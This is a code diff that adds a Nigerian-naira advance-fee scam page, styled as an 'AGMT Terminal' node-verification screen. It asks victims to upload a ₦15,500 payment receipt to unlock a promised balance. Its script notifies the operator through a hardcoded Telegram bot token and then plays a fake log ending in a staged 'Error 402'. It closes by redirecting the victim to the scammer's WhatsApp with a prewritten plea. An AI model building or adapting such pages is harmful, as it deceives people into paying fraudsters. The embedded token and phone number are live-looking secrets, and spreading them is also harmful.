@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Node Verification | AGMT Terminal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        
+        body { background: var(--bg); color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+
+        .verify-container { width: 100%; max-width: 420px; animation: slideUp 0.5s ease-out; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .glass-card { 
+            background: var(--card); 
+            border: 1px solid var(--border); 
+            border-radius: 40px; 
+            padding: 40px 30px; 
+            text-align: center; 
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+
+        .status-icon { 
+            width: 80px; height: 80px; background: rgba(37, 99, 235, 0.1); 
+            border-radius: 50%; display: flex; align-items: center; 
+            justify-content: center; margin: 0 auto 25px; font-size: 32px;
+            border: 1px solid var(--primary);
+        }
+
+        h2 { font-weight: 800; font-size: 24px; margin-bottom: 12px; letter-spacing: -1px; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+
+        .upload-zone { 
+            border: 2px dashed var(--border); 
+            border-radius: 25px; 
+            padding: 40px 20px; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            position: relative;
+            background: rgba(255,255,255,0.02);
+            margin-bottom: 30px;
+        }
+        .upload-zone:hover { border-color: var(--primary); background: rgba(37, 99, 235, 0.05); }
+        #file-input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
+        
+        .upload-label { font-size: 13px; font-weight: 700; color: #cbd5e1; display: block; }
+        #file-display { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--accent); margin-top: 15px; font-weight: 800; display: none; }
+
+        #terminal { display: none; margin-top: 10px; }
+        .terminal-box { 
+            background: #000; 
+            border-radius: 15px; 
+            padding: 20px; 
+            text-align: left; 
+            margin-bottom: 20px;
+            border: 1px solid #1e293b;
+            min-height: 120px;
+        }
+        .line { font-family: 'JetBrains Mono', monospace; font-size: 10px; margin-bottom: 5px; color: #10b981; }
+        .line.err { color: #ef4444; }
+
+        .btn-finalize { 
+            width: 100%; 
+            background: var(--primary); 
+            color: white; 
+            padding: 22px; 
+            border-radius: 20px; 
+            border: none; 
+            font-weight: 800; 
+            font-size: 16px; 
+            cursor: pointer; 
+            transition: 0.3s;
+        }
+        .btn-finalize:disabled { background: #1e293b; color: #475569; cursor: not-allowed; }
+
+        .footer-note { margin-top: 30px; font-size: 11px; color: #475569; letter-spacing: 1px; font-weight: 700; }
+    </style>
+</head>
+<body>
+
+    <div class="verify-container">
+        <div class="glass-card">
+            <div class="status-icon" id="main-icon">📡</div>
+            <div id="content-view">
+                <h2>Final Clearance</h2>
+                <p>Upload your ₦15,500 settlement receipt to synchronize your node and release your total balance.</p>
+
+                <div class="upload-zone">
+                    <input type="file" id="file-input" accept="image/*" onchange="handleFile()">
+                    <span class="upload-label">SELECT SCREENSHOT</span>
+                    <div id="file-display">ATTACHMENT_READY.JPG</div>
+                </div>
+
+                <button class="btn-finalize" id="action-btn" onclick="runSecurityCheck()" disabled>
+                    FINALIZE VERIFICATION
+                </button>
+            </div>
+
+            <div id="terminal">
+                <div class="terminal-box" id="log-box"></div>
+                <p style="font-size: 12px; color: #64748b;">DO NOT CLOSE THIS TERMINAL</p>
+            </div>
+        </div>
+        <div class="footer-note">AGMT INFRASTRUCTURE • SECURED NODE</div>
+    </div>
+
+    <script>
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
+        const myWA = "2348059573160"; // UPDATED NUMBER
+
+        function handleFile() {
+            const file = document.getElementById('file-input').files[0];
+            if (file) {
+                document.getElementById('file-display').innerText = "✓ " + file.name.toUpperCase();
+                document.getElementById('file-display').style.display = "block";
+                document.getElementById('action-btn').disabled = false;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📸 <b>VERIFY:</b> User has selected their screenshot! Standby for WhatsApp.&parse_mode=html`);
+            }
+        }
+
+        function addLog(text, isErr = false) {
+            const box = document.getElementById('log-box');
+            const line = document.createElement('div');
+            line.className = isErr ? 'line err' : 'line';
+            line.innerText = `> ${text}`;
+            box.appendChild(line);
+        }
+
+        function runSecurityCheck() {
+            document.getElementById('content-view').style.display = "none";
+            document.getElementById('terminal').style.display = "block";
+            document.getElementById('main-icon').innerText = "⚙️";
+
+            setTimeout(() => addLog("INITIATING LEDGER SYNC..."), 500);
+            setTimeout(() => addLog("FETCHING BANKING API HASH..."), 1500);
+            setTimeout(() => addLog("IDENTIFYING INBOUND TRANSACTION..."), 3000);
+            setTimeout(() => addLog("ERROR: HIGH-VOLUME LIQUIDITY DETECTED", true), 5000);
+            setTimeout(() => addLog("ERROR [CODE: 402]: MANUAL ADMIN CLEARANCE REQUIRED", true), 7000);
+
+            setTimeout(() => {
+                const message = encodeURIComponent("Hello AGMT Admin, I have successfully uploaded my ₦15,500 verification receipt. The system is showing Error 402: Manual Clearance Required. Please verify my payment so I can withdraw my $200+ balance.");
+                window.location.href = `https://wa.me/${myWA}?text=${message}`;
+            }, 8500);
+        }
+    </script>
+</body>
+</html>
+
